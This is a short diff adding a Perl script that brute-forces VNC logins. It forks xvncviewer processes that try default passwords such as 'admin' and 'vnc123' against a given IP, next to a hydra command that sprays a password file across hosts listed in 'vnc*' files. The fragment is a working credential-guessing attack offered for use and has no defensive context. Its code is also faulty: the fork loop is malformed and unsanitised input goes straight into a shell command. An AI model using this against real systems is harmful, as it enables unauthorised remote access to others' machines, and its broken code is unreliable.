@@ -1,3 +1,13 @@
+use Parallel::ForkManager;
+my $ip = $ARGV[0];
+my $pm = Parallel::ForkManager->new(4);
+my @items = ('admin','vnc123','1','123');
+ITEM_LOOP: foreach my $item (@items) {
+    $pm->start and next ITEM_LOOP; 
+    qx!echo \"$item\" \| xvncviewer -autopass $ip!;
+    print "Processing item: $$ $item $ip\n";
+$pm->start and next ITEM_LOOP;
+}
 #Sample sudo apt install libparallel-forkmanager-perl
 hydra -o done -P password -t 9 -M vnc*
 cat scan  | 
